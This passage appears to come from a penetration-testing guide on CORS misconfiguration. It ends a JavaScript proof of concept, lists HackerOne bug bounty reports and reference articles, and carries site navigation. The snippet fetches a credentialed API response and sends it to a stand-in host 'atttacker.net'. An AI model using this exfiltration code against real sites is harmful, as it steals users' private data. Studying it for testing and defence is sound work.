+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">req</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XMLHttpRequest</span>(); 
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">onload</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">reqListener</span>; 
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#39;get&#39;</span>,<span style="color:#e6db74">&#39;https://api.example.com/endpoint&#39;</span>,<span style="color:#66d9ef">true</span>); 
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">withCredentials</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>;
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">send</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">reqListener</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">location</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;//atttacker.net/log?key=&#39;</span><span style="color:#f92672">+</span><span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">responseText</span>; 
+</span></span><span style="display:flex;"><span>};
+</span></span></code></pre></div><h2 id="bug-bounty-reports">
+  Bug Bounty reports
+  <a class="anchor" href="#bug-bounty-reports">#</a>
+</h2>
+<ul>
+<li>
+  <a href="https://hackerone.com/reports/168574">CORS Misconfiguration on www.zomato.com - James Kettle (albinowax)</a></li>
+<li>
+  <a href="https://hackerone.com/reports/426147">CORS misconfig | Account Takeover - niche.co - Rohan (nahoragg)</a></li>
+<li>
+  <a href="https://hackerone.com/reports/235200">Cross-origin resource sharing misconfig | steal user information - bughunterboy (bughunterboy)</a></li>
+<li>
+  <a href="https://hackerone.com/reports/430249">CORS Misconfiguration leading to Private Information Disclosure - sandh0t (sandh0t)</a></li>
+<li>
+  <a href="https://hackerone.com/reports/470298">[██████] Cross-origin resource sharing misconfiguration (CORS) - Vadim (jarvis7)</a></li>
+</ul>
+<h2 id="references">
+  References
+  <a class="anchor" href="#references">#</a>
+</h2>
+<ul>
+<li>
+  <a href="https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397">Think Outside the Scope: Advanced CORS Exploitation Techniques - @Sandh0t - May 14 2019</a></li>
+<li>
+  <a href="https://portswigger.net/blog/exploiting-cors-misconfigurations-for-bitcoins-and-bounties">Exploiting CORS misconfigurations for Bitcoins and bounties - James Kettle | 14 October 2016</a></li>
+<li>
+  <a href="https://www.geekboy.ninja/blog/exploiting-misconfigured-cors-cross-origin-resource-sharing/">Exploiting Misconfigured CORS (Cross Origin Resource Sharing) - Geekboy - DECEMBER 16, 2016</a></li>
+<li>
+  <a href="https://www.corben.io/advanced-cors-techniques/">Advanced CORS Exploitation Techniques - Corben Leo - June 16, 2018</a></li>
+<li>
+  <a href="https://portswigger.net/web-security/cors">PortSwigger Web Security Academy: CORS</a></li>
+<li>
+  <a href="https://blog.detectify.com/2018/04/26/cors-misconfigurations-explained/">CORS Misconfigurations Explained - Detectify Blog</a></li>
+</ul>
+</article>
+ 
+      
+
+      <footer class="book-footer">
+        
+  <div class="flex flex-wrap justify-between">
+
+
+
+
+  <div>
+    <a class="flex align-center" href="https://github.com/m00tiny/grayhatfreelancing/edit/main/exampleSite/content.en/docs/cors_misconfigurations.md" target="_blank" rel="noopener">
+      <img src="/svg/edit.svg" class="book-icon" alt="Edit" />
+      <span>Edit this page</span>
+    </a>
+  </div>
+
+
+</div>
+
+
+
+  <script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script>
+
+
+ 
+        
+      </footer>
+
+      
+  
+ 
+
+      <label for="menu-control" class="hidden book-menu-overlay"></label>
+    </div>
+
+    
+    <aside class="book-toc">
+      <div class="book-toc-content">
+        
+  
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#cors-misconfiguration">CORS Misconfiguration</a>
+      <ul>
+        <li><a href="#tools">Tools</a></li>
+        <li><a href="#prerequisites">Prerequisites</a></li>
+        <li><a href="#exploitation">Exploitation</a>
+          <ul>
+            <li><a href="#vulnerable-example-origin-reflection">Vulnerable Example: Origin Reflection</a></li>
+            <li><a href="#vulnerable-example-null-origin">Vulnerable Example: Null Origin</a></li>
+            <li><a href="#vulnerable-example-xss-on-trusted-origin">Vulnerable Example: XSS on Trusted Origin</a></li>
+            <li><a href="#vulnerable-example-wildcard-origin--without-credentials">Vulnerable Example: Wildcard Origin <code>*</code> without Credentials</a></li>
+            <li><a href="#vulnerable-example-expanding-the-origin--regex-issues">Vulnerable Example: Expanding the Origin / Regex Issues</a></li>
+          </ul>
+        </li>
+        <li><a href="#bug-bounty-reports">Bug Bounty reports</a></li>
+        <li><a href="#references">References</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+
+
+ 
+      </div>
+    </aside>
+    
+  </main>
+
+  
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
